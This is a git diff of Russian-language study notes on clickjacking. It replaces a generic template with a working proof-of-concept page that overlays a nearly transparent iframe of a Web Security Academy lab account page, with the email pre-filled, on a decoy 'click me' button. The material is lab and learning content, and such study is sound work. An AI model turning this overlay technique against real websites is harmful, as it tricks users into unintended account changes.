@@ -7,29 +7,42 @@ CSRF токены не защищают от этого вида атак. За�
 ## Construct basic clickjacking attack
 
 ```markup
-<head>
-	<style>
-		#target_website {
-			position:relative;
-			width:128px;
-			height:128px;
-			opacity:0.00001;
-			z-index:2;
-			}
-		#decoy_website {
-			position:absolute;
-			width:300px;
-			height:400px;
-			z-index:1;
-			}
-	</style>
-</head>
-...
-<body>
-	<div id="decoy_website">
-	...decoy web content here...
-	</div>
-	<iframe id="target_website" src="https://vulnerable-website.com">
-	</iframe>
-</body>
+<html>
+    <head>
+        <title>UI Redressing PoC</title>
+        <style>
+            #target_website {
+                position:relative;
+                width:700px;
+                height:500px;
+                opacity:0.2;
+                z-index:2;  /* Элемент с наиболее высоким z-index, перекрывает другие
+                               Тем самым видимая часть (div) будет наверху, но фактически активным будет iframe
+                            */
+            }
+            #decoy_website {
+                position:absolute;
+                z-index:1;
+            }
+            #btn_action {
+                position: relative;
+                width: 100px;
+                height: 20px;
+                color: brown; 
+                top: 445px;  
+                left: 40px;   
+            }
+        </style>
+    </head>
+    <body>
+        <div id="decoy_website">
+            <button id="btn_action">
+                click me
+            </button>
+            ...decoy web content here...
+        </div>
+        <iframe id="target_website" src="https://0ac0003404fc3984c07807190024003a.web-security-academy.net/my-account?email=email2@gmail.com">
+        </iframe>
+    </body>
+</html>
 ```
